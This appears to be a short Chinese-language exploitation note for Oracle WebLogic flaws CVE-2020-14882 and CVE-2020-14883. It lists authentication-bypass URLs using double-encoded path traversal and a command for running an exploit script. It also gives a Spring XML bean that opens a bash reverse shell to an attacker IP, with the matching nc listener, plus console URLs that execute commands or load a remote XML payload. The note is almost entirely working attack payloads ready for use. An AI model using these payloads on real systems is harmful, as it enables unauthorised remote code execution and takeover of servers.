CVE-2020-14882 未授权访问的poc

http://yourip:7001/console/images/%252E%252E%252Fconsole.portal
http://yourip:7001/console/css/%25%32%65%25%32%65%25%32%66console.portal


CVE-2020-14883 RCE的利用

1.可以借助dnslog

2.可以借助python脚本
python CVE-2020-14882_ALL.py -u http://192.168.248.183:7001 -c "ls"    #ip、端口为靶机的

3.可以借助xml文件 这个是通杀的  但是需要靶机可以访问到xml文件的服务器  
把xml放到同内网或者公网vps上 能访问就行


<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
	<value>/bin/bash</value>
        <value>-c</value>
        <value><![CDATA[bash -i >& /dev/tcp/192.168.248.183/54321  0>&1]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>


之后黑客机器上
nc -lvp 54321

攻击机器可以执行这个
python3 CVE-2020-14882_ALL.py -u http://target_mechine_ip:7001/ -x http://your_httpserver_ip:8000/poc.xml


（4）同理利用 但是执行命令的思路不同

http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/success1');")


xml的方法：

http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://example.com/rce.xml")


